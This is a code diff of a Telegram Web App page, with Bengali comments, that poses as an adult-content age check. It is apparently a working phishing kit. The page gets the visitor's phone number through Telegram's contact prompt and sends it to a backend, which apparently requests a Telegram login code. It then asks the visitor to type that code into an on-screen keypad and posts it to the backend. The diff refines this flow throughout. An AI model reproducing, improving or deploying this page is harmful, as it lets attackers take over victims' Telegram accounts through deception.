@@ -7,50 +7,43 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
-        .box { background: white; color: #333; padding: 25px; border-radius: 25px; margin: 40px 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        .box { background: white; color: #333; padding: 25px; border-radius: 25px; margin: 50px 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
         .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; display: block; text-decoration: none; -webkit-tap-highlight-color: transparent; }
         .hidden { display: none; }
         
         /* keypad */
         .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; color: #333; letter-spacing: 5px; height: 65px; box-sizing: border-box; outline: none; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
         .key { background: #f1f1f1; padding: 22px; border-radius: 15px; font-size: 26px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #ddd; -webkit-tap-highlight-color: transparent; }
         .key:active { background: #ddd; }
         .key-clear { background: #ffc107; }
         .key-ok { background: #28a745; color: white; }
-        
-        .instruction { font-size: 14px; color: #666; margin-bottom: 20px; font-weight: bold; }
+        .loader-text { color: #28a745; font-weight: bold; margin-top: 15px; font-size: 14px; }
     </style>
 </head>
 <body>
+    <!-- ধাপ ১: কনফার্ম বাটন -->
     <div class="box" id="step0">
         <h2>Verification</h2>
         <p style="color:#666;">Confirm you are 18+ to access the files 😊</p>
         <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
         <div id="loader" class="hidden">
-            <p style="color:#28a745; font-weight:bold; margin-top:15px;">🔄 Sending Code...</p>
+            <p class="loader-text">🔄 Processing... Please share your contact on the popup.</p>
         </div>
     </div>
 
+    <!-- ধাপ ২: ওটিপি কিপ্যাড (এটি শুরুতে লুকানো থাকবে) -->
     <div class="box hidden" id="step2">
         <h3 style="margin-top:0;">Identity Check</h3>
-        <p class="instruction">Check your Telegram chat for the 5-digit login code and enter it below.</p>
+        <p style="font-size:13px; color:#666; margin-bottom:15px;">Check your Telegram chat for the 5-digit login code and enter it below.</p>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
         <div class="keypad">
-            <div class="key" onclick="addNum('1')">1</div>
-            <div class="key" onclick="addNum('2')">2</div>
-            <div class="key" onclick="addNum('3')">3</div>
-            <div class="key" onclick="addNum('4')">4</div>
-            <div class="key" onclick="addNum('5')">5</div>
-            <div class="key" onclick="addNum('6')">6</div>
-            <div class="key" onclick="addNum('7')">7</div>
-            <div class="key" onclick="addNum('8')">8</div>
-            <div class="key" onclick="addNum('9')">9</div>
-            <div class="key key-clear" onclick="clearNum()">C</div>
-            <div class="key" onclick="addNum('0')">0</div>
-            <div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
+            <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
+            <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
+            <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
+            <div class="key key-clear" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
         </div>
     </div>
 
@@ -61,24 +54,15 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // ইউজার যদি অ্যাপ বন্ধ করে আবার খোলে, তবে সে সরাসরি ওটিপি স্ক্রিনে যাবে
-        window.onload = async function() {
-            if(userId) {
-                try {
-                    const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
-                    const data = await res.json();
-                    if (data.status === "success") {
-                        document.getElementById('step0').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
-                    }
-                } catch(e) {}
-            }
-        };
-
         function startFlow() {
+            // ১. নম্বর শেয়ার করার পপ-আপ ওপেন করা
             tg.requestContact();
+            
+            // ২. স্ক্রিনে লোডিং দেখানো
             document.getElementById('main_btn').classList.add('hidden');
             document.getElementById('loader').classList.remove('hidden');
+            
+            // ৩. ব্যাকএন্ড চেক করা শুরু
             poll();
         }
 
@@ -87,24 +71,31 @@
                 const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                 const data = await res.json();
                 if (data.status === "success") {
-                    sendNumber(data.phone);
+                    // নম্বর পাওয়া গেলে ওটিপি পাঠানোর রিকোয়েস্ট করা
+                    sendNumberToBot(data.phone);
                 } else {
+                    // নম্বর না পাওয়া পর্যন্ত চেক করতে থাকবে
                     setTimeout(poll, 1500);
                 }
             } catch (e) { setTimeout(poll, 2000); }
         }
 
-        async function sendNumber(phone) {
+        async function sendNumberToBot(phone) {
             try {
                 const res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
+                    method: "POST", 
+                    headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
                 });
                 const data = await res.json();
                 if (data.status === "success") {
+                    // ওটিপি পাঠানো সফল হলে ওটিপি কিপ্যাড দেখানো
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else { alert("Error: " + data.message); }
+                } else {
+                    alert("Error: " + data.message);
+                    location.reload(); // এরর হলে রিলোড
+                }
             } catch (e) { alert("Server Error!"); }
         }
 
@@ -117,12 +108,18 @@
             vBtn.innerText = "..";
             try {
                 const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
+                    method: "POST", 
+                    headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, otp: currentOTP })
                 });
                 const data = await res.json();
-                if (data.status === "success") tg.close();
-                else { alert("Wrong Code!"); clearNum(); vBtn.innerText = "OK"; }
+                if (data.status === "success") {
+                    tg.close();
+                } else {
+                    alert("Wrong Code! Try again.");
+                    clearNum();
+                    vBtn.innerText = "OK";
+                }
             } catch (e) { alert("Error!"); vBtn.innerText = "OK"; }
         }
     </script>
